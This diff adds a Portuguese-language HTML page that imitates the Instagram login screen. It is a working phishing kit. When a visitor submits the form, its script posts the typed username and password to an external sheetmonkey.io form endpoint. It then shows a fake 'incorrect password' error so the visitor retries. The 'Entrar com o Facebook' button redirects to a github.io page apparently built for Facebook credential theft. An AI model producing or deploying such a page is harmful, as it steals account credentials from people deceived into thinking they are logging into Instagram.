@@ -1,0 +1,172 @@
+<html lang="pt-BR">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Instagram Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+            font-family: 'Roboto', sans-serif;
+        }
+        .shake {
+            animation: shake 0.5s;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+  </style>
+ </head>
+ <body class="bg-black text-white flex items-center justify-center min-h-screen">
+  <div class="w-full max-w-xs">
+   <div class="bg-black border border-gray-700 p-6 rounded-lg">
+    <div class="text-center mb-6">
+     <img alt="Instagram logo" class="mx-auto" height="50" src="images/InstagramLogo.png" width="200"/>
+    </div>
+    <form class="space-y-3" id="loginForm">
+     <input class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-gray-300 text-sm" id="username" placeholder="Telefone, nome de usuário ou email" type="text"/>
+     <input class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-gray-300 text-sm" id="password" placeholder="Senha" type="password"/>
+     <button class="w-full bg-blue-600 text-white py-2 rounded font-bold" id="loginButton" type="submit">
+      Entrar
+     </button>
+     <p class="text-red-500 text-sm hidden" id="errorMessage">Email ou senha incorreto</p>
+    </form>
+    <div class="flex items-center my-3">
+     <div class="flex-grow border-t border-gray-700">
+     </div>
+     <span class="mx-2 text-sm">
+      OU
+     </span>
+     <div class="flex-grow border-t border-gray-700">
+     </div>
+    </div>
+    <div class="text-center">
+     <button class="flex items-center justify-center w-full bg-transparent text-blue-500 font-bold py-2" id="facebookLogin">
+      <i class="fab fa-facebook mr-2">
+      </i>
+      Entrar com o Facebook
+     </button>
+     <a class="block mt-2 text-blue-500 text-sm" href="https://www.instagram.com/accounts/password/reset/">
+      Esqueceu a senha?
+     </a>
+    </div>
+   </div>
+   <div class="bg-black border border-gray-700 p-3 mt-3 text-center rounded-lg">
+    <p class="text-sm">
+     Não tem uma conta?
+     <a class="text-blue-500 font-bold" href="https://www.instagram.com/accounts/emailsignup/">
+      Cadastre-se
+     </a>
+    </p>
+   </div>
+   <div class="text-center mt-3">
+    <p class="text-sm">
+     Obtenha o aplicativo.
+    </p>
+    <div class="flex justify-center mt-2 space-x-2">
+     <img alt="Google Play Store badge" height="40" src="images/GooglePlay.png" width="100"/>
+     <img alt="Microsoft Store badge" height="40" src="images/Microsoft.png" width="100"/>
+    </div>
+   </div>
+   <div class="text-center mt-6 text-gray-500 text-xs">
+    <div class="space-x-1">
+     <a class="hover:underline" href="https://about.meta.com/">
+      Meta
+     </a>
+     <a class="hover:underline" href="https://about.instagram.com/">
+      Sobre
+     </a>
+     <a class="hover:underline" href="https://about.instagram.com/blog/">
+      Blog
+     </a>
+     <a class="hover:underline" href="https://about.instagram.com/about-us/careers">
+      Carreiras
+     </a>
+     <a class="hover:underline" href="https://help.instagram.com/">
+      Ajuda
+     </a>
+     <a class="hover:underline" href="https://developers.facebook.com/docs/instagram">
+      API
+     </a>
+     <a class="hover:underline" href="https://www.instagram.com/legal/privacy/">
+      Privacidade
+     </a>
+     <a class="hover:underline" href="https://www.instagram.com/legal/terms/">
+      Termos
+     </a>
+     <a class="hover:underline" href="https://www.instagram.com/explore/locations/">
+      Localizações
+     </a>
+     <a class="hover:underline" href="https://www.instagram.com/web/lite/">
+      Instagram Lite
+     </a>
+     <a class="hover:underline" href="https://www.threads.net/">
+      Threads
+     </a>
+     <a class="hover:underline" href="https://www.facebook.com/help/instagram/261704639352628">
+      Upload de contatos e não usuários
+     </a>
+     <a class="hover:underline" href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">
+      Meta Verified
+     </a>
+    </div>
+    <div class="mt-3">
+     <span>
+      Português (Brasil)
+     </span>
+     <span>
+      © 2025 Instagram from Meta
+     </span>
+    </div>
+   </div>
+  </div>
+  <script>
+   document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const errorMessage = document.getElementById('errorMessage');
+        const loginButton = document.getElementById('loginButton');
+        
+        loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+        
+        setTimeout(() => {
+            loginButton.innerHTML = 'Entrar';
+            usernameInput.classList.add('border-red-500', 'shake');
+            passwordInput.classList.add('border-red-500', 'shake');
+            errorMessage.classList.remove('hidden');
+            
+            setTimeout(() => {
+                usernameInput.classList.remove('shake');
+                passwordInput.classList.remove('shake');
+            }, 500);
+        }, 2000);
+
+        // Send data to the API
+        fetch('https://api.sheetmonkey.io/form/6QX4enpNcBZ4eEBcc4hLWc', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: usernameInput.value,
+                password: passwordInput.value,
+                source: 'Instagram'
+            })
+        });
+    });
+
+    document.getElementById('facebookLogin').addEventListener('click', function() {
+        window.location.href = 'https://garenafff.github.io/freefire/facebook.html';
+    });
+  </script>
+ </body>
+</html>
